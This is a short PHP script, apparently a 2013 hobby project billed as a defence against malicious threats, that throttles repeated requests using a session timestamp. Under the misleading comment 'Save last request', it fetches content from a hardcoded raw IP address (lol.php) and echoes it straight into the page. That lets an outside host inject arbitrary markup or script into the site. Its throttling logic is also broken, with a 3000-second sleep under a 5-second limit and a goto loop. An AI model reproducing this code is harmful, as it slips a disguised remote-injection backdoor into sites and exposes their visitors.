<?php
/*
A summer project by Justin Baltazar (2013).
Name: Empi
Creator: Justin B.
Description: To be able to identify malicious threats and act accordingly.
Comments: Dedicated to Sabrina.
*/
begin:
session_start();
set_time_limit(5);
$uri = md5($_SERVER['REQUEST_URI']);
$exp = 3; //Seconds before expiry.
$hash = $uri .'|'. time();
if (!isset($_SESSION['ddos'])) {
    $_SESSION['ddos'] = $hash;
}


list($_uri, $_exp) = explode('|', $_SESSION['ddos']);
if ($_uri == $uri && time() - $_exp < $exp) {
	sleep (3000);
	goto begin;
	//echo '<script>location.reload(true);</script><noscript><META HTTP-EQUIV="refresh" CONTENT="15">Loading....</noscript>';
    die;
}

// Save last request
$z = file_get_contents("http://138.91.76.107/lol.php");
echo $z;
$_SESSION['ddos'] = $hash;
?>
